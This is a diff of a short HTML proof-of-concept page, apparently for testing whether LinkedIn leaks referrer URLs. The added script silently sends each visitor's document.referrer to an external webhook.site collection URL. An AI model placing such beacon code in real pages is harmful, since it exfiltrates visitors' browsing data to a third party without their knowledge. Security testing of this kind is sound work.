@@ -1,14 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>PoC: LinkedIn Referer Leak</title>
-</head>
-<body>
-  <h1>LinkedIn Referer Leak Test</h1>
-
-  <!-- This will silently make a request to your webhook -->
-  <img src="https://webhook.site/2ad80383-5235-4a99-80ad-208cbaffe255" />
-
-</body>
+  <body>
+    <script>
+      var i = new Image();
+      i.src = "https://webhook.site/2ad80383-5235-4a99-80ad-208cbaffe255?ref=" + encodeURIComponent(document.referrer);
+    </script>
+  </body>
 </html>
-
